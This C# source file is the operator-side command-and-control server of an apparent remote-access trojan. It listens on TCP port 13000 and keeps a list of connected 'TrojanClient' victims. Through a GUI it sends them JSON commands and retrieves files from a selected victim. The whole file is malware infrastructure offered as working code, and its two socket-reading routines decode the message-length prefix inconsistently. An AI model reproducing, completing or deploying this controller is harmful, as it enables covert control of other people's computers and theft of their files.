using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Server.UI;
using Newtonsoft.Json;

namespace Server.TCP
{

    public class TcpServer
    {
        static Window1 serverGUI;

        private const Int32 PORT = 13000;

        public TcpListener tcpServer;

        private List<TrojanClient> trojanClients = new List<TrojanClient>();

        public TcpServer()
        {
            serverGUI = new Window1();
            serverGUI.Show();
            serverGUI.SentPressed += SendMessage;
            serverGUI.GetFiles += GetFiles;

            BackgroundWorker worker1 = new BackgroundWorker();
            worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
            worker1.RunWorkerAsync();
        }

        private void Worker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                {
                    tcpServer = new TcpListener(IPAddress.Any, PORT);
                    tcpServer.Start();
                    while (true)
                    {
                        var client = await tcpServer.AcceptTcpClientAsync();

                        await ReceiveFromSocket(client, RegisterClient);
                    }

                }));
            }
            catch (Exception ex)
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(delegate ()
                {
                    serverGUI.DisplayOutput(ex.Message + "\n");
                }));
            }
            finally
            {
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }
            }
        }

        async void SendMessage(object sender, EventArgs e)
        {
            int clientId = serverGUI.GetClientId();
            int commandId = serverGUI.GetCommandId();
            if (clientId >= 0 && commandId >= 0)
            {
                var trojanClient = trojanClients[serverGUI.GetClientId()];
                var client = trojanClient.Client;


                // Get a stream object for reading and writing

                NetworkStream stream = client.GetStream();
                Command command = new Command(commandId, serverGUI.GetParameters());
                string output = JsonConvert.SerializeObject(command);
                try
                {
                    SendOnSocket(stream, output);
                    await ReceiveFromSocket(stream, serverGUI.DisplayOutput);
                }
                catch
                {
                    serverGUI.DisplayOutput("Client does not respond.");
                    RemoveClient(trojanClient);
                }
            }
            else
            {
                serverGUI.DisplayOutput("Select a client and a command.");
            }
        }

        private void RemoveClient(TrojanClient trojanClient)
        {
            trojanClients.Remove(trojanClient);
            serverGUI.SetClients(trojanClients.Select(x => x.Name));
        }

        private void RemoveClient(TcpClient client)
        {
            var trojanClient = trojanClients.Where(x => x.Client == client).FirstOrDefault();
            if (trojanClient != null)
                RemoveClient(trojanClient);
        }

        private void RegisterClient(TcpClient client, string clientName)
        {
            //var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            trojanClients.Add(new TrojanClient(client, clientName));
            serverGUI.SetClients(trojanClients.Select(x => x.Name));
        }

        private async void GetFiles(object sender, EventArgs e)
        {
            int clientId = serverGUI.GetClientId();
            int commandId = serverGUI.GetCommandId();
            if (clientId >= 0 && commandId >= 0)
            {
                var trojanClient = trojanClients[serverGUI.GetClientId()];
                var client = trojanClient.Client;
                var bytes = new Byte[256];

                // Get a stream object for reading and writing

                NetworkStream stream = client.GetStream();
                Command command = new Command(0, serverGUI.GetFile());
                string output = JsonConvert.SerializeObject(command);
                try
                {
                    SendOnSocket(stream, output);
                    await ReceiveFromSocket(stream, serverGUI.UpdateList);
                }
                catch
                {
                    serverGUI.DisplayOutput("Client does not respond.");
                    RemoveClient(trojanClient);
                }
            }
            else
            {
                serverGUI.DisplayOutput("Select a client and a command.");
            }
        }

        private async void SendOnSocket(NetworkStream stream, string message)
        {

            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
            byte[] messageLength = BitConverter.GetBytes((Int32)message.Length);
            if (stream.CanWrite)
            {
                await stream.WriteAsync(messageLength, 0, messageLength.Length);
                await stream.WriteAsync(msg, 0, msg.Length);
            }
        }

        private async Task ReceiveFromSocket(NetworkStream stream, Action<string> act)
        {
            int i = 0;
            string responseLength = "";
            var length = new Byte[4];
            Byte[] bytes = null;
            if (stream.CanRead)
            {
                i = await stream.ReadAsync(length, 0, 4);
                responseLength = System.Text.Encoding.ASCII.GetString(length, 0, i);

                bytes = new Byte[Int32.Parse(responseLength)];
                i = await stream.ReadAsync(bytes, 0, bytes.Length);
            }
            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            Response responseObj = JsonConvert.DeserializeObject<Response>(response);
            act(responseObj.response);
        }

        private async Task ReceiveFromSocket(TcpClient client, Action<TcpClient, string> act)
        {

            NetworkStream stream = client.GetStream();
            int i = 0;
            var length = new Byte[4];
            Byte[] bytes = null;
            if (stream.CanRead)
            {
                i = await stream.ReadAsync(length, 0, 4);
                
                Array.Reverse(length);
                
                int lengthNumber = BitConverter.ToInt32(length, 0);
                bytes = new Byte[lengthNumber];
                i = await stream.ReadAsync(bytes, 0, bytes.Length);
                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                act(client, response);
            }
        }
    }
}
